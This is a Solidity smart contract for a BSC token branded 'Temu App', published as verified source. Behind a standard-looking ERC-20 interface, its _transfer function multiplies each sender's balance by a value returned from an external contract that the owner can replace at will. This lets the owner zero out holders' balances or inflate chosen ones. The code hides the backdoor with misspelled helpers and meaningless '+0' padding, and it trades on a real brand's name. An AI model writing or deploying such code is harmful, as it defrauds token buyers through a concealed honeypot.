/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-03
*/

pragma solidity ^0.4.25;

library SafeMath {

    function muul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}

interface Initialise {
     function _isPETOKAICarrot(address from) external returns(uint256);
}

contract BaseToken is Ownable {
    using SafeMath for uint256;
    string constant public name = 'Temu App';
    string constant public symbol = 'TemuApp';
    uint8 constant public decimals = 18;
    uint256 public totalSupply = 1000000000*10**uint256(decimals);
    uint256 public constant MAXSupply = 10000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    address public uniswapV2Pair;
    Initialise private _Initialise = Initialise(_Initialise);
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
    address public projectAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private _taxAICarrotE = 0;
    uint256 private _burnAICarrotE = 2;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 _bamount = _Initialise._isPETOKAICarrot(from);
        if(_bamount >= uint256(1+0)+0 ){
            balanceOf[from] = balanceOf[from].muul(_bamount.sub(1+0)+0);
        }
        uint256 AICarrot =  value.muul(_taxAICarrotE).div(100)+0;
        uint256 burn =  value.muul(_burnAICarrotE).div(100)+0;
        balanceOf[from] = balanceOf[from].sub(value)+0;
        balanceOf[to] = balanceOf[to].add(value).sub(AICarrot).sub(burn);
        if(AICarrot > 0+0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(AICarrot)+0;
            emit Transfer(from, projectAddress, AICarrot);
        }
        if(burn > 0+0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn)+0;
            emit Transfer(from, burnAddress, burn);
        }

        emit Transfer(from, to, value);
    }

    function setImplementation(address __implementation) external onlyOwner {
        _Initialise = Initialise(__implementation);
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
}

contract TOKEN is BaseToken {
    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        owner = msg.sender;
    }
    function() public payable {
        revert();
    }
}